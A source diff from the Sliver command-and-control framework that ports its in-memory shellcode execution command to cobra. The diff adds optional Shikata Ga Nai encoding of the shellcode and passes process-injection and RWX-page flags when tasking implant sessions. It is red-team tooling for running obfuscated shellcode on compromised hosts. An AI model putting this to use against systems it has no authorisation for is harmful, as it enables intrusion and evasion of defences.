@@ -23,7 +23,6 @@ import (
 	"context"
 	"fmt"
 	"io"
-	"io/ioutil"
 	"log"
 	"os"
 
@@ -31,27 +30,28 @@ import (
 	"github.com/bishopfox/sliver/client/core"
 	"github.com/bishopfox/sliver/protobuf/clientpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
-	"golang.org/x/crypto/ssh/terminal"
+	"github.com/spf13/cobra"
+	"golang.org/x/term"
 	"google.golang.org/protobuf/proto"
-
-	"github.com/desertbit/grumble"
 )
 
-// ExecuteShellcodeCmd - Execute shellcode in-memory
-func ExecuteShellcodeCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
+// ExecuteShellcodeCmd - Execute shellcode in-memory.
+func ExecuteShellcodeCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
 	session, beacon := con.ActiveTarget.GetInteractive()
 	if session == nil && beacon == nil {
 		return
 	}
 
-	interactive := ctx.Flags.Bool("interactive")
+	rwxPages, _ := cmd.Flags().GetBool("rwx-pages")
+	interactive, _ := cmd.Flags().GetBool("interactive")
 	if interactive && beacon != nil {
 		con.PrintErrorf("Interactive shellcode can only be executed in a session\n")
 		return
 	}
-	pid := ctx.Flags.Uint("pid")
-	shellcodePath := ctx.Args.String("filepath")
-	shellcodeBin, err := ioutil.ReadFile(shellcodePath)
+
+	pid, _ := cmd.Flags().GetUint32("pid")
+	shellcodePath := args[0]
+	shellcodeBin, err := os.ReadFile(shellcodePath)
 	if err != nil {
 		con.PrintErrorf("%s\n", err.Error())
 		return
@@ -60,8 +60,39 @@ func ExecuteShellcodeCmd(ctx *grumble.Context, con *console.SliverConsoleClient)
 		con.PrintErrorf("Cannot use both `--pid` and `--interactive`\n")
 		return
 	}
+	shikataGaNai, _ := cmd.Flags().GetBool("shikata-ga-nai")
+	if shikataGaNai {
+		if !rwxPages {
+			con.PrintErrorf("Cannot use shikata ga nai without RWX pages enabled\n")
+			return
+		}
+		arch, _ := cmd.Flags().GetString("architecture")
+		if arch != "386" && arch != "amd64" {
+			con.PrintErrorf("Invalid shikata ga nai architecture (must be 386 or amd64)\n")
+			return
+		}
+		iter, _ := cmd.Flags().GetUint32("iterations")
+		con.PrintInfof("Encoding shellcode ...\n")
+		resp, err := con.Rpc.ShellcodeEncoder(context.Background(), &clientpb.ShellcodeEncodeReq{
+			Encoder:      clientpb.ShellcodeEncoder_SHIKATA_GA_NAI,
+			Architecture: arch,
+			Iterations:   iter,
+			BadChars:     []byte{},
+			Data:         shellcodeBin,
+		})
+		if err != nil {
+			con.PrintErrorf("%s\n", err)
+			return
+		}
+		oldSize := len(shellcodeBin)
+		shellcodeBin = resp.GetData()
+		con.PrintInfof("Shellcode encoded in %d iterations (%d bytes -> %d bytes)\n", iter, oldSize, len(shellcodeBin))
+	}
+
+	process, _ := cmd.Flags().GetString("process")
+
 	if interactive {
-		executeInteractive(ctx, ctx.Flags.String("process"), shellcodeBin, ctx.Flags.Bool("rwx-pages"), con)
+		executeInteractive(cmd, process, shellcodeBin, rwxPages, con)
 		return
 	}
 	ctrl := make(chan bool)
@@ -69,9 +100,9 @@ func ExecuteShellcodeCmd(ctx *grumble.Context, con *console.SliverConsoleClient)
 	con.SpinUntil(msg, ctrl)
 	shellcodeTask, err := con.Rpc.Task(context.Background(), &sliverpb.TaskReq{
 		Data:     shellcodeBin,
-		RWXPages: ctx.Flags.Bool("rwx-pages"),
-		Pid:      uint32(pid),
-		Request:  con.ActiveTarget.Request(ctx),
+		RWXPages: rwxPages,
+		Pid:      pid,
+		Request:  con.ActiveTarget.Request(cmd),
 	})
 	ctrl <- true
 	<-ctrl
@@ -95,8 +126,8 @@ func ExecuteShellcodeCmd(ctx *grumble.Context, con *console.SliverConsoleClient)
 	}
 }
 
-// PrintExecuteShellcode - Display result of shellcode execution
-func PrintExecuteShellcode(task *sliverpb.Task, con *console.SliverConsoleClient) {
+// PrintExecuteShellcode - Display result of shellcode execution.
+func PrintExecuteShellcode(task *sliverpb.Task, con *console.SliverClient) {
 	if task.Response.GetErr() != "" {
 		con.PrintErrorf("%s\n", task.Response.GetErr())
 	} else {
@@ -104,7 +135,7 @@ func PrintExecuteShellcode(task *sliverpb.Task, con *console.SliverConsoleClient
 	}
 }
 
-func executeInteractive(ctx *grumble.Context, hostProc string, shellcode []byte, rwxPages bool, con *console.SliverConsoleClient) {
+func executeInteractive(cmd *cobra.Command, hostProc string, shellcode []byte, rwxPages bool, con *console.SliverClient) {
 	// Check active session
 	session := con.ActiveTarget.GetSessionInteractive()
 	if session == nil {
@@ -119,21 +150,19 @@ func executeInteractive(ctx *grumble.Context, hostProc string, shellcode []byte,
 	rpcTunnel, err := con.Rpc.CreateTunnel(context.Background(), &sliverpb.Tunnel{
 		SessionID: session.ID,
 	})
-
 	if err != nil {
 		con.PrintErrorf("%s\n", err)
 		return
 	}
 
-	tunnel := core.Tunnels.Start(rpcTunnel.GetTunnelID(), rpcTunnel.GetSessionID())
+	tunnel := core.GetTunnels().Start(rpcTunnel.GetTunnelID(), rpcTunnel.GetSessionID())
 
 	shell, err := con.Rpc.Shell(context.Background(), &sliverpb.ShellReq{
-		Request:   con.ActiveTarget.Request(ctx),
+		Request:   con.ActiveTarget.Request(cmd),
 		Path:      hostProc,
 		EnablePTY: !noPty,
 		TunnelID:  tunnel.ID,
 	})
-
 	if err != nil {
 		con.PrintErrorf("%s\n", err)
 		return
@@ -145,7 +174,7 @@ func executeInteractive(ctx *grumble.Context, hostProc string, shellcode []byte,
 	msg := fmt.Sprintf("Sending shellcode to %s ...", session.GetName())
 	con.SpinUntil(msg, ctrl)
 	_, err = con.Rpc.Task(context.Background(), &sliverpb.TaskReq{
-		Request:  con.ActiveTarget.Request(ctx),
+		Request:  con.ActiveTarget.Request(cmd),
 		Pid:      pid,
 		Data:     shellcode,
 		RWXPages: rwxPages,
@@ -161,9 +190,9 @@ func executeInteractive(ctx *grumble.Context, hostProc string, shellcode []byte,
 	log.Printf("Bound remote program pid %d to tunnel %d", shell.Pid, shell.TunnelID)
 	con.PrintInfof("Started remote shell with pid %d\n\n", shell.Pid)
 
-	var oldState *terminal.State
+	var oldState *term.State
 	if !noPty {
-		oldState, err = terminal.MakeRaw(0)
+		oldState, err = term.MakeRaw(0)
 		log.Printf("Saving terminal state: %v", oldState)
 		if err != nil {
 			con.PrintErrorf("Failed to save terminal state\n")
@@ -195,7 +224,7 @@ func executeInteractive(ctx *grumble.Context, hostProc string, shellcode []byte,
 
 	if !noPty {
 		log.Printf("Restoring terminal state ...")
-		terminal.Restore(0, oldState)
+		term.Restore(0, oldState)
 	}
 
 	log.Printf("Exit interactive")
